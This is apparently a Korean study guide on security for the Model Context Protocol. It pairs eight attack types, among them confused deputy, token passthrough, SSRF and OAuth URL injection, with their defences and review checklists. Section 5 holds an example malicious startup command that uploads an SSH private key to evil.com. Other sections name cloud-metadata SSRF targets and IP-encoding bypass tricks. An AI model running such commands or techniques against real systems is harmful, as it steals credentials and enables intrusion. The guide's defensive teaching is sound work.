# 보안 — 공격 벡터 카탈로그와 방어

## 학습 목표

MCP 특유의 공격 8종(confused deputy, token passthrough, SSRF, 핸들 탈취, 로컬 서버 침해, OAuth URL 주입, mix-up, localhost 사칭)의 성립 조건과 방어를 짝지어 말할 수 있고, 스코프 최소화 원칙으로 설계를 리뷰할 수 있다.

## 선수 지식

- [10-authorization.md](10-authorization.md) 전체
- [08-mrtr-client-features.md](08-mrtr-client-features.md)의 requestState·elicitation 보안

## 핵심 원리 (WHY)

MCP의 위험은 "임의 데이터 접근 + 임의 코드 실행 + 자동화된 결정자(LLM)"의 조합에서 나온다. 프로토콜이 경계를 긋지만 강제하지는 못하므로, 이 파일의 공격들은 전부 **구현이 경계를 느슨하게 다룰 때** 성립한다. 각 공격의 공통 구조: **한 문맥에서 발급된 신뢰(쿠키·토큰·핸들·URL)가 다른 문맥에서 재사용된다.** 방어의 공통 구조: 신뢰를 발급 문맥(사용자·클라이언트·요청·audience)에 바인딩하고, 경계를 넘을 때마다 재검증한다.

## 필수 지식 (HOW)

### 1. Confused Deputy — 프록시 서버의 동의 우회

**무대**: MCP 프록시 서버(서드파티 API로 위임하는 서버)가 서드파티 AS에 **정적 client_id** 하나로 등록돼 있고, 자기 앞에서는 MCP 클라이언트들의 **동적 등록**을 받는 구조.

**성립 조건 4개가 모두 갖춰질 때**: 정적 client_id + 동적 클라이언트 등록 허용 + 서드파티 AS의 **동의 쿠키**(한 번 동의하면 스킵) + 프록시의 클라이언트별 동의 부재.

**공격**: ① 피해자가 정상적으로 한 번 인가 → 서드파티 AS가 "client_id=프록시"에 대한 동의 쿠키를 심음 ② 공격자가 프록시에 `redirect_uri=attacker.com`으로 악성 클라이언트를 동적 등록 ③ 조작된 인가 링크를 피해자에게 전송 ④ 피해자 브라우저의 쿠키 때문에 **동의 화면이 스킵**되고 ⑤ 인가 코드가 attacker.com으로 리다이렉트 ⑥ 공격자가 코드를 토큰으로 교환 → 피해자로서 서드파티 API 접근.

**방어**(프록시 서버 MUST): 서드파티로 넘어가기 **전에** 자체 동의 화면 — client_id별 동의 레지스트리 유지·확인, 동의 UI에 클라이언트 이름·요청 스코프·redirect_uri 표시, CSRF 방어·클릭재킹 방지(frame-ancestors), redirect_uri **정확 일치** 검증. 동의 쿠키를 쓴다면 `__Host-` 프리픽스 + Secure/HttpOnly/SameSite=Lax + 서명 + client_id에 바인딩. **state는 동의 승인 후에만 심고**, 콜백에서 정확 일치·단일 사용·짧은 만료 검증 — 동의 전에 심으면 동의 화면 자체가 무력화된다.

### 2. Token Passthrough — audience 검증 실패의 종착지

서버가 "자기용으로 발급되지 않은 토큰"을 받아 하류 API로 그대로 넘기는 안티패턴. 두 겹의 실패: ① audience 미검증(다른 서비스용 토큰 수락 — OAuth 경계 붕괴) ② 무수정 전달(하류가 "상류에서 검증됐겠지"라고 오신뢰 — confused deputy화).

**위험 목록**: 레이트리밋·요청 검증·모니터링 등 통제 우회, 클라이언트 구별 불능·감사 추적 붕괴(하류 로그에 엉뚱한 출처), 도난 토큰의 프록시형 유출 통로, 신뢰 경계 붕괴(한 서비스 침해가 연결된 전체로), 미래 보안 통제 추가의 발목.

**방어**: 자기에게 명시적으로 발급된 토큰 외 수락 금지(MUST NOT). 상류 호출은 자기가 클라이언트로서 받은 **별도 토큰**으로.

### 3. SSRF — 디스커버리가 fetch를 부른다

**클라이언트 측**: OAuth 디스커버리 중 클라이언트가 fetch하는 URL들(`resource_metadata`, `authorization_servers`, AS 메타데이터의 각 엔드포인트)은 **악성 서버가 통제**할 수 있다. `http://169.254.169.254/`(클라우드 메타데이터 → IAM 자격증명), `http://localhost:6379/`(로컬 Redis), 사설 IP, 검증 후 재해석되는 DNS 리바인딩, 리다이렉트 체인이 무기가 된다.

**방어**(서버 배포형 클라이언트 MUST 고려): HTTPS 강제(루프백 개발 예외만), **사설·예약 대역 차단**(10/8, 172.16/12, 192.168/16, 127/8, 링크로컬 169.254/16, IPv6 fc00::/7·fe80::/10) — 단 IP 검증을 **직접 구현하지 말 것**(8진수·16진수·IPv4-mapped IPv6 인코딩 트릭을 놓친다), 리다이렉트 대상에도 동일 검증, egress 프록시(Smokescreen류), DNS 핀ning(TOCTOU 대비).

**AS 측도 같다**: CIMD를 받는 AS는 "모르는 클라이언트가 준 URL을 fetch"하므로 동일 방어 적용.

### 4. State Handle Hijacking

무상태 세계의 핸들([06](06-tools.md))을 훔치거나 추측해 남의 상태에 접근. **방어**: 핸들 소지 ≠ 인증(MUST NOT — 모든 요청은 별도 인증 검증), 안전한 난수로 비결정적 핸들(SHOULD), 서버 측에서 `<검증된 user_id>:<handle>`로 키잉해 다른 주체의 제시를 거부(SHOULD), 만료.

### 5. 로컬 MCP 서버 침해

로컬 서버는 사용자 권한으로 도는 다운로드된 바이너리다. 공격 경로: 설정 파일에 심긴 악성 startup 커맨드(`npx pkg && curl -d @~/.ssh/id_rsa evil.com`), 서버 자체의 악성 페이로드, localhost에 떠 있는 서버로의 DNS 리바인딩.

**방어**: 원클릭 설치 클라이언트는 실행 전 동의 필수(MUST) — **실행될 정확한 커맨드를 생략 없이 표시**, 위험 작업임을 명시, 명시적 승인. 추가로(SHOULD): 위험 패턴(sudo, rm -rf, 민감 경로) 하이라이트, 샌드박스 실행·최소 권한. 서버 제작자는 stdio를 쓰거나, HTTP라면 토큰·유닉스 소켓으로 접근 제한.

### 6. OAuth URL 검증 — javascript:와 셸

악성 서버가 주는 인가 URL이 `javascript:…`면 `window.open()`에서 XSS, 셸로 URL을 열면(`cmd.exe`, `sh -c`) 커맨드 주입 RCE. **프록시 구조**에선 XSS → 프록시 인증 토큰 탈취 → 프록시에게 임의 stdio 커맨드 실행 요청 → 시스템 장악까지 상승한다.

**방어**(클라이언트 MUST): `http`/`https`만 허용(allowlist 방식 — `javascript:`·`data:`·`file:`·`vbscript:` 거부, http는 루프백 개발용만), **셸로 URL 열기 금지**(플랫폼 네이티브 API 사용), 수신 URL 새니타이즈. 웹 클라이언트는 CSP(`script-src 'self'`). 프록시는 spawned 프로세스 샌드박스·로깅.

### 7. Mix-Up과 localhost 사칭

**Mix-up**: [10](10-authorization.md)의 iss 검증이 방어. 기억할 것: PKCE도 resource indicator도 이건 못 막는다. 정직한 AS가 iss를 안 주면 방어도 없다.

**Localhost redirect 사칭**: CIMD는 도메인 통제는 증명하지만 **어느 로컬 프로세스가 localhost 포트를 잡고 있는지는 증명 못 한다**. 공격자가 정품 클라이언트의 CIMD URL을 client_id로 쓰고 자기가 임의 포트를 리슨하면, AS와 사용자 모두 정품 이름을 보게 된다. **방어**(AS): localhost 전용 redirect_uri에 추가 경고(SHOULD), 인가 중 리다이렉트 호스트 명확 표시(MUST), 필요시 추가 증명(attestation). CIMD 수용 정책(도메인 allowlist, 평판, 도메인 연령)은 AS 재량.

### 8. Scope 최소화 — 설계 원칙으로서의 보안

넓은 스코프 토큰(`files:*`, `admin:*`)이 털리면 무관한 기능까지 한 번에 뚫린다(블라스트 반경). 부수 피해: 철회 마찰(만능 토큰 철회 = 전 워크플로우 중단), 감사 소음, 과다 동의 화면으로 인한 사용자 이탈.

**처방**: 최소 초기 스코프(`scopes_supported`는 기본 기능 최소 집합만) + 필요 시점 step-up 챌린지 + 다운스코프 수용. **흔한 실수 목록**(리뷰 체크리스트로): 전 스코프를 scopes_supported에 게시, 와일드카드·만능 스코프, 무관 권한 번들링, 챌린지마다 전체 카탈로그 반환, 버전 없는 스코프 의미 변경, 토큰의 스코프 클레임만 믿고 서버측 인가 로직 생략.

### 횡단 원칙 (튜토리얼의 공통 피탈)

토큰 검증·인가 로직 직접 구현 금지(검증된 라이브러리), 짧은 수명 토큰, Authorization 헤더·토큰·코드 **로깅 금지**, 프로덕션 HTTPS 강제, 에러는 클라이언트에 일반화·내부엔 상관 ID로 상세 로깅, 단일 issuer 고정(멀티테넌트가 아니라면 같은 AS의 다른 realm 토큰도 거부).

## 우리 작업과의 연결

이 카탈로그는 "MCP 서버·클라이언트 코드리뷰 체크리스트"로 그대로 쓸 수 있다. 프록시형 서버(우리 API를 서드파티로 위임)를 만든다면 1·2번이, 호스트 앱을 만든다면 3·5·6번이, 무상태 도구 서버라면 4번이 첫 페이지다.

### ⚠️ 암기 필수

- [ ] **confused deputy 성립 4조건**: 정적 client_id + 동적 등록 + 동의 쿠키 + 프록시의 클라이언트별 동의 부재 → 방어 = 서드파티 전 **자체 per-client 동의**(+ state는 동의 후 발급, redirect_uri 정확 일치)
  - 이유: 프록시형 MCP 서버의 대표 취약점. 조건 하나만 깨도 공격이 무너진다는 것이 설계 지렛대
- [ ] **SSRF 방어 4종**: HTTPS 강제 / 사설·예약 대역 차단(직접 파싱 구현 금지) / 리다이렉트에도 동일 검증 / egress 프록시. 대상 = 디스커버리로 fetch하는 모든 URL(클라이언트와 CIMD 받는 AS 양쪽)
  - 이유: "메타데이터를 가져온다"는 무해해 보이는 단계가 클라우드 자격증명 유출 통로다
- [ ] **elicitation·URL 열기 안전 규칙**: 서버가 준 URL은 http/https allowlist + 셸 실행 금지 + 자동 프리페치 금지 + 전체 URL 표시 후 동의
  - 이유: XSS→RCE 상승 경로의 차단점이 전부 클라이언트의 URL 취급에 있다

## 자가 진단

<details>
<summary>Q1: confused deputy 공격에서 "동의 쿠키"가 하는 역할은? 프록시의 자체 동의 화면이 이를 어떻게 무력화하나?</summary>

**즉답 예시**: 서드파티 AS는 client_id(=프록시의 정적 ID) 기준으로 동의를 기억하므로, 피해자가 예전에 한 번 동의했다면 공격자가 유도한 인가 요청에서 동의 화면이 스킵된다 — 사용자가 이상함을 알아챌 기회가 사라진다. 프록시가 서드파티로 넘어가기 전에 **자기 레벨에서 "이 (동적 등록된) 클라이언트가 이 스코프를 요청한다"**를 클라이언트별로 묻으면, 공격자의 악성 클라이언트는 피해자에게 낯선 동의 화면을 띄우게 되고 쿠키 스킵이 소용없어진다.

</details>

<details>
<summary>Q2: 사설 IP 차단을 정규식으로 직접 구현하면 안 되는 이유는?</summary>

**즉답 예시**: 공격자는 같은 주소를 여러 인코딩으로 쓸 수 있다 — 8진수(0177.0.0.1), 16진수(0x7f000001), 정수형(2130706433), IPv4-mapped IPv6(::ffff:127.0.0.1) 등. 직접 짠 파서는 이런 변형을 놓치기 쉽다. 검증된 라이브러리·플랫폼 기능을 쓰고, DNS 리바인딩(검증 시점과 사용 시점의 해석이 다른 TOCTOU)까지 고려해 egress 프록시 같은 네트워크 레벨 방어를 병행하라.

</details>

<details>
<summary>Q3: "짧은 TTL + 주체 바인딩된 핸들이면 인증 검증은 생략해도 된다"는 주장의 오류는?</summary>

**즉답 예시**: 핸들 소지를 인증으로 취급하는 것 자체가 금지다(MUST NOT). TTL·바인딩은 탈취 창을 좁힐 뿐이고, 검증의 근거는 항상 요청의 자격증명(검증된 토큰의 주체)이어야 한다. 서버는 매 요청 인증을 검증하고, 핸들은 그 주체의 네임스페이스(`user:handle`) 안에서만 해석해야 한다.

</details>

<details>
<summary>Q4: 스코프 설계에서 "Recommended approach"가 최소도 최대도 아닌 이유는?</summary>

**즉답 예시**: 최소 접근(그 작업에 필요한 스코프만 챌린지)은 안전하지만 작업마다 재인가 왕복이 생겨 UX가 무너지고, 확장 접근(미래 필요까지 선반영)은 블라스트 반경·동의 이탈을 키운다. 권장안은 "현재 작업 + 통상 함께 쓰이는 관련 스코프"를 한 챌린지에 담아 step-up 횟수와 권한 폭의 균형을 잡는 것 — 결국 서버가 UX 영향과 위험을 저울질해 일관되게 정할 문제다.

</details>

## 공식 문서

- [Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices) — 공격·완화 전체 카탈로그
- [Authorization Security Considerations](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations) — 규범적 요구
- [Elicitation § Security](https://modelcontextprotocol.io/specification/2026-07-28/client/elicitation) — URL 취급·피싱
